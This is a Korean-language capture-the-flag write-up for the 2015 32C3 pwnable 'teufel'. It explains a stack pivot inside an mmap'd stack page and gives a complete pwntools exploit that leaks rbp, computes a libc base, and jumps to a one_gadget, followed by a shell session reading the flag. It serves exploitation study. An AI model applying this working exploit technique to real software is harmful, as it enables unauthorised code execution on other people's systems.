# 2015 32C3 - [PWN] teufel

## Key words

- Virtual Memory Privilege
- Stack overflow/underflow

## Check Security

```
[*] '/home/tbkim/ctf/pwnable/0020_2015_32C3_teufel/teufel'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Solution

문제는 손으로 제작한 듯 어셈블리로 시작합니다.

전체적인 모습을 코드로 나타내면 다음과 같습니다.

```c
int sub_4004E6()
{
  size_t buf; // [sp+0h] [bp-8h]@1

  JUMPOUT(read(0, &buf, 8uLL), 0LL, &loc_4004DE);
  JUMPOUT(read(0, &buf, buf), 0LL, &loc_4004DE);
  puts((const char *)&buf);
  return fflush(0LL);
}

void __noreturn start()
{
  void *v0; // rax@1
  __int64 v1; // rax@2

  v0 = mmap(0LL, 0x3000uLL, 0, 34, 0, 0LL);
  if ( v0 != (void *)-1 )
  {
    LODWORD(v1) = mprotect((char *)v0 + 4096, 0x1000uLL, 3);
    if ( v1 != -1 )
    {
      while ( 1 )
        sub_4004E6();
    }
  }
  _exit(0);
}
```

`mmap` 으로 페이지를 할당한 후, 해당 페이지를 스택으로 사용하는데 `v0` 영역 근처에 `wr` 권한이 없기 때문에 `sub_4004e6` 에서 오버플로우를 이용해서 공격하기가 까다롭습니다.

```
gdb-peda$ vmmap
Start              End                Perm  Name
0x00400000         0x00401000         r-xp  /home/tbkim/ctf/pwnable/0020_2015_32C3_teufel/teufel
0x00600000         0x00601000         r--p  /home/tbkim/ctf/pwnable/0020_2015_32C3_teufel/teufel
0x00601000         0x00622000         rw-p  [heap]
0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp  /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7dcd000 ---p  /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 r--p  /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p  /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p  mapped
0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp  /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7fda000 0x00007ffff7fdd000 rw-p  mapped
0x00007ffff7ff3000 0x00007ffff7ff4000 ---p  mapped
-> 0x00007ffff7ff4000 0x00007ffff7ff5000 rw-p  mapped
0x00007ffff7ff5000 0x00007ffff7ff6000 ---p  mapped
0x00007ffff7ff6000 0x00007ffff7ff8000 rw-p  mapped
0x00007ffff7ff8000 0x00007ffff7ffa000 r--p  [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp  [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 r--p  /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p  /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffe000 0x00007ffff7fff000 rw-p  mapped
0x00007ffffffde000 0x00007ffffffff000 rw-p  [stack]
0xffffffffff600000 0xffffffffff601000 r-xp  [vsyscall]
```

`0x00007ffff7ff4000 - 0x00007ffff7ff5000` 위치가 할당된 위치인데 위 아래 페이지가 모두 `---p` 이기 때문에 스택을 잘못 사용하면 바로 메모리 커럽션 에러가 발생합니다.

아이디어는 `rbp` 를 `0x00007ffff7ff4000` 와 `0x00007ffff7ff5000`의 사이인 `0x00007ffff7ff4800` 으로 맞추게 되면 페이지 위 아래로 `0x800` 정도의 `rw` 여유가 생기기 때문에 문제에서 의도했던 오류를 피할 수 있습니다.

`rbp`를 위로 옮기기 위해 아래 가젯을 사용합니다.

```
.text:00000000004004CD                 add     rbp, 2000h
.text:00000000004004D4                 mov     rsp, rbp
```

이렇게 하지 않으면 `rsp`가 스택 상단을 때리게 되어 메모리 커럽션이 발생합니다.

처음에 `RBP`를 릭하여 현재 위치와 `libc` 주소를 계산하고 `one_shot` 가젯을 넣으면 되는데 두 번째 페이로드에서 주의할점은 `RBP+0x2000`을 하지 않기 때문에 이를 고려해서 `RBP`를 넣어줘야 `one_shot` 중간에 문제가 발생하지 않습니다.

## Solution code 

```python
from pwn import *

target = "./teufel"

p = process(target)

# local ASLR ON - shared library not provided
libc_off = 0x5f0000
vul_addr = 0x4004e6

p.send(p64(0xf0))

payload = "A"*8
payload += "Z"

p.send(payload)

# 41414141414141415a50fff7ff7f0a
data = p.recv()
rbp = "\x00" + data.split("Z")[1][:-1]
rbp = u64(rbp.ljust(8, "\x00"))
libc_base = rbp - libc_off
one_shot  = libc_base + 0x4526a
ret_again = 0x4004cd
system    = libc_base + 0x45390

print "rbp    : {}".format(hex(rbp))
print "libc   : {}".format(hex(libc_base))
print "system : {}".format(hex(system))

p.send(p64(0xf0))
payload = p64(0xf0)
payload += p64(rbp-0x2800)
payload += p64(ret_again)
p.send(payload)
print p.recv()

p.send(p64(0xf0))

payload = p64(0xf0)
payload += p64(rbp-0x800)
payload += p64(one_shot)
p.send(payload)

p.interactive()
```


## Result

```
tbkim@ubuntu:~/ctf/pwnable/0020_2015_32C3_teufel$ python sol_teufel.py 
[+] Starting local process './teufel': pid 91825
rbp    : 0x7f6e56a5b000
libc   : 0x7f6e5646b000
system : 0x7f6e564b0390

[*] Switching to interactive mode 
$ ls -l
total 6216
-rw------- 1 tbkim tbkim 4472832 Aug 18 21:24 core
-rw-rw-r-- 1 tbkim tbkim      24 Aug 18 20:35 flag.txt
-rwxrwxrwx 1 tbkim tbkim 1869392 Dec 26  2015 libc.so.6
-rw-r--r-- 1 root  root       18 Aug 18 21:34 peda-session-teufel.txt
-rw-rw-r-- 1 tbkim tbkim     787 Aug 18 21:37 sol_teufel.py
-rwxrwxrwx 1 tbkim tbkim    5192 Dec 13  2015 teufel
$ cat flag.txt
32C3_mov_pop_ret_repeat
$ 
[*] Stopped process './teufel' (pid 91825)
```